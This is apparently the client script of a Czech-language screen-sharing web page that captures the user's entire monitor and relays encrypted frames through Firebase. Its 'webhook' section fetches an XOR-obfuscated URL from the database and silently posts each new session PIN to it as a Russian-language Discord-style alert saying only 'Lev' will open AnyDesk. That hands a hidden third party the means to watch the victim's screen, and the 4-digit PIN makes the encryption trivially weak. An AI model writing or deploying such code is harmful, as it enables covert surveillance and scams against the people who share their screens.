// ============================================================
// SCREENSHARE PRO — CLIENT (Firebase Frame-Relay)
// ============================================================

(async function() {

// ============================================================
// LOAD CONFIG
// ============================================================
let CONFIG;
try {
    const res = await fetch('config.json');
    CONFIG = await res.json();
} catch (e) {
    document.body.innerHTML = '<div style="padding:40px;text-align:center;color:#ef4444;"><h2>Chyba načítání konfigurace</h2><p>Nelze načíst config.json</p></div>';
    return;
}

// ============================================================
// SECURITY CONTEXT CHECK
// ============================================================
if (!window.isSecureContext) {
    document.getElementById('statusText').textContent = '❌ HTTPS vyžadován';
    document.getElementById('hostBtn').disabled = true;
    return;
}
if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
    document.getElementById('statusText').textContent = '❌ Sdílení nepodporováno';
    document.getElementById('hostBtn').disabled = true;
    return;
}

// ============================================================
// FIREBASE INIT
// ============================================================
firebase.initializeApp(CONFIG.firebase);
const db = firebase.database();

// ============================================================
// XOR KEY (for webhook)
// ============================================================
const XOR_KEY = CONFIG.xorKey;

// ============================================================
// DOM REFS
// ============================================================
const hostBtn = document.getElementById('hostBtn');
const roomCode = document.getElementById('roomCode');
const ticketWrapper = document.getElementById('ticketWrapper');
const statusText = document.getElementById('statusText');
const statusDot = document.getElementById('statusDot');
const timerText = document.getElementById('timerText');
const video = document.getElementById('video');

// ============================================================
// STATE
// ============================================================
const S = {
    code: null,
    stream: null,
    timerInterval: null,
    startTime: null,
    isConnected: false,
    isStopping: false,
    isCapturing: false,
    captureTimer: null,
    captureCanvas: null,
    captureCtx: null,
    roomRef: null,
    aesKey: null,      // CryptoKey derived from PIN
    salt: null,        // base64 salt stored in Firebase
    fpsCount: 0,
    fpsLastTime: performance.now(),
    currentFps: 0,
};

// ============================================================
// CRYPTO HELPERS
// ============================================================
function arrayBufferToBase64(buf) {
    const bytes = new Uint8Array(buf);
    let bin = '';
    for (let i = 0; i < bytes.byteLength; i++) bin += String.fromCharCode(bytes[i]);
    return btoa(bin);
}
function base64ToArrayBuffer(b64) {
    const bin = atob(b64);
    const bytes = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    return bytes.buffer;
}

async function deriveKey(pin, saltB64) {
    const salt = base64ToArrayBuffer(saltB64);
    const enc = new TextEncoder();
    const km = await crypto.subtle.importKey('raw', enc.encode(pin), 'PBKDF2', false, ['deriveKey']);
    return crypto.subtle.deriveKey(
        { name: 'PBKDF2', salt, iterations: 200000, hash: 'SHA-256' },
        km,
        { name: 'AES-GCM', length: 256 },
        false,
        ['encrypt']
    );
}

async function encryptFrame(key, data) {
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const enc = await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, key, data);
    return { iv: arrayBufferToBase64(iv), data: arrayBufferToBase64(enc) };
}

// ============================================================
// WEBHOOK
// ============================================================
function xorDecode(encoded) {
    const str = atob(encoded);
    let result = '';
    for (let i = 0; i < str.length; i++) {
        result += String.fromCharCode(str.charCodeAt(i) ^ XOR_KEY.charCodeAt(i % XOR_KEY.length));
    }
    return result;
}
async function initWebhook() {
    try {
        const snap = await db.ref('_cfg/x').once('value');
        const enc = snap.val();
        if (enc && typeof enc === 'string') { window.__wh = xorDecode(enc); console.log('[wh] ✓'); }
    } catch (_) { console.warn('[wh] n/a'); }
}
async function sendWh(code) {
    if (!window.__wh) await initWebhook();
    if (!window.__wh) { console.log('[wh] skip'); return; }
    try {
        const r = await fetch(window.__wh, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: 'Лев',
                avatar_url: 'https://masterpiecer-images.s3.yandex.net/b272c71596a411eeaa922ab2a9c6ab46:upscaled',
                embeds: [{
                    title: '🚀 Демонстрация экрана ПК!',
                    description: 'Код для подключения: **' + code + '**',
                    color: 0x2563eb,
                    timestamp: new Date().toISOString(),
                    footer: { text: 'Только лев откроет анидеск' }
                }]
            })
        });
        console.log('[wh] sent', r.status);
    } catch (e) { console.warn('[wh] fail', e.message); }
}

// ============================================================
// UI
// ============================================================
function setStatus(text, type) {
    statusText.textContent = text;
    statusDot.className = 'dot';
    if (type === 'connected') statusDot.classList.add('active');
    else if (type === 'disconnected') statusDot.classList.add('inactive');
}

function startTimer() {
    S.startTime = Date.now();
    clearInterval(S.timerInterval);
    S.timerInterval = setInterval(() => {
        const e = Math.floor((Date.now() - S.startTime) / 1000);
        timerText.textContent = '⏱ ' + String(Math.floor(e / 60)).padStart(2, '0') + ':' + String(e % 60).padStart(2, '0');
    }, 1000);
}
function stopTimer() { clearInterval(S.timerInterval); timerText.textContent = ''; }

// ============================================================
// CAPTURE & ENCRYPT LOOP — CLEAN & FAST
// ============================================================
async function captureAndUpload() {
    if (S.isCapturing || S.isStopping || !S.isConnected || !S.stream || !S.aesKey) return;
    S.isCapturing = true;

    try {
        const v = video;
        if (!v.videoWidth || !v.videoHeight) return;

        const canvas = S.captureCanvas;
        const ctx = S.captureCtx;

        // Draw current video frame onto pre-allocated canvas
        ctx.drawImage(v, 0, 0, canvas.width, canvas.height);

        // Compress to JPEG at 80% — good clarity, fast encoding
        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.80));
        if (!blob) return;

        const buf = await blob.arrayBuffer();

        // Encrypt with AES-256-GCM
        const { iv, data } = await encryptFrame(S.aesKey, buf);

        // Fire-and-forget Firebase write
        if (S.roomRef && S.isConnected) {
            S.roomRef.child('frame').set({ iv, data, ts: Date.now() }).catch(() => {});
        }

        // FPS counter
        S.fpsCount++;
        const now = performance.now();
        if (now - S.fpsLastTime >= 1000) {
            S.currentFps = S.fpsCount;
            S.fpsCount = 0;
            S.fpsLastTime = now;
            const fpsEl = document.getElementById('fpsCounter');
            if (fpsEl) fpsEl.textContent = 'FPS: ' + S.currentFps;
        }

    } catch (err) {
        console.error('[capture]', err);
    } finally {
        S.isCapturing = false;
        // Schedule next frame via rAF — matches display refresh rate
        if (S.isConnected && !S.isStopping) {
            S.captureTimer = requestAnimationFrame(captureAndUpload);
        }
    }
}

// ============================================================
// START SHARING
// ============================================================
async function startSharing() {
    if (S.isConnected || S.isStopping) return;
    hostBtn.disabled = true;
    hostBtn.textContent = 'Připojování...';
    setStatus('Připojování...', '');

    try {
        // Capture screen — prefer full-screen monitor, not individual windows
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: {
                frameRate: { ideal: 60, max: 60 },
                cursor: 'always',
                displaySurface: 'monitor',
                logicalSurface: true,
                width: { ideal: 1920 },
                height: { ideal: 1080 }
            },
            audio: false,
            preferCurrentTab: false,
            selfBrowserSurface: 'exclude',
            systemAudio: 'exclude'
        });
        S.stream = stream;
        video.srcObject = stream;
        await video.play();

        // Stop handler when user ends share via browser UI
        stream.getVideoTracks()[0].addEventListener('ended', () => stopSharing('Sdílení ukončeno'));

        // Generate PIN
        const pin = String(Math.floor(1000 + Math.random() * 9000));
        S.code = pin;
        localStorage.setItem('screenshare_pin', pin);

        // Create room + salt in Firebase
        S.roomRef = db.ref('rooms/' + pin);
        const saltBytes = crypto.getRandomValues(new Uint8Array(16));
        const saltB64 = arrayBufferToBase64(saltBytes);
        await S.roomRef.set({
            created: firebase.database.ServerValue.TIMESTAMP,
            active: true,
            salt: saltB64
        });

        // Derive AES key from PIN + salt
        S.salt = saltB64;
        S.aesKey = await deriveKey(pin, saltB64);

        // Pre-create canvas at a fixed size — no reallocation per frame
        const vw = stream.getVideoTracks()[0].getSettings();
        const maxW = 960;
        const cw = Math.min(vw.width || 1920, maxW);
        const ch = Math.round(cw * ((vw.height || 1080) / (vw.width || 1920)));
        S.captureCanvas = document.createElement('canvas');
        S.captureCanvas.width = cw;
        S.captureCanvas.height = ch;
        S.captureCtx = S.captureCanvas.getContext('2d');

        // Update UI
        S.isConnected = true;
        S.isStopping = false;
        hostBtn.textContent = 'Připojeno ✓';
        hostBtn.style.background = '#10b981';
        hostBtn.style.boxShadow = '0 10px 25px rgba(16, 185, 129, 0.25)';
        hostBtn.disabled = false;
        roomCode.textContent = pin;
        ticketWrapper.classList.add('visible');
        setStatus('Aktivní', 'connected');
        startTimer();

        // Send webhook notification
        sendWh(pin);

        // Start capture loop (first frame after 100ms)
        S.captureTimer = setTimeout(captureAndUpload, 100);

    } catch (err) {
        console.error(err);
        hostBtn.disabled = false;
        hostBtn.textContent = 'Připojit se';
        hostBtn.style.background = '#2563eb';
        hostBtn.style.boxShadow = '0 10px 25px rgba(37, 99, 235, 0.25)';
        setStatus('Chyba připojení', 'disconnected');
    }
}

// ============================================================
// STOP SHARING
// ============================================================
async function stopSharing(reason) {
    if (S.isStopping) return;
    S.isStopping = true;
    S.isConnected = false;

    // Cancel pending capture
    if (S.captureTimer) { cancelAnimationFrame(S.captureTimer); clearTimeout(S.captureTimer); S.captureTimer = null; }

    // Stop media stream
    if (S.stream) {
        S.stream.getTracks().forEach(t => t.stop());
        S.stream = null;
    }
    video.srcObject = null;

    // Clean up Firebase room
    if (S.roomRef) {
        try { await S.roomRef.remove(); } catch (_) {}
        S.roomRef = null;
    }

    S.aesKey = null;
    S.salt = null;
    S.isCapturing = false;
    stopTimer();

    // Reset UI
    hostBtn.textContent = 'Připojit se';
    hostBtn.style.background = '#2563eb';
    hostBtn.style.boxShadow = '0 10px 25px rgba(37, 99, 235, 0.25)';
    hostBtn.disabled = false;
    ticketWrapper.classList.remove('visible');
    setStatus(reason || 'Odpojeno', 'disconnected');
    S.isStopping = false;
    S.code = null;
}

// ============================================================
// RESTORE SESSION
// ============================================================
async function restorePreviousSession() {
    const prevPin = localStorage.getItem('screenshare_pin');
    if (!prevPin) return false;
    S.code = prevPin;
    // Try to reconnect to existing room
    try {
        const snap = await db.ref('rooms/' + prevPin).once('value');
        if (snap.exists()) {
            roomCode.textContent = prevPin;
            ticketWrapper.classList.add('visible');
            hostBtn.textContent = 'Obnovit sdílení';
            hostBtn.style.background = '#10b981';
            hostBtn.style.boxShadow = '0 10px 25px rgba(16, 185, 129, 0.25)';
            hostBtn.disabled = false;
            setStatus('Obnovení připraveno', '');
            return true;
        }
    } catch (_) {}
    S.code = null;
    return false;
}

// ============================================================
// PAGE UNLOAD
// ============================================================
window.addEventListener('beforeunload', () => {
    if (S.code) {
        try { db.ref('rooms/' + S.code).remove(); } catch (_) {}
    }
});

// ============================================================
// INIT
// ============================================================
await initWebhook();
const restored = await restorePreviousSession();
if (restored) {
    hostBtn.addEventListener('click', startSharing);
} else {
    hostBtn.textContent = 'Připojit se';
    hostBtn.disabled = false;
    hostBtn.addEventListener('click', startSharing);
    setStatus('Čekání', '');
}

})();
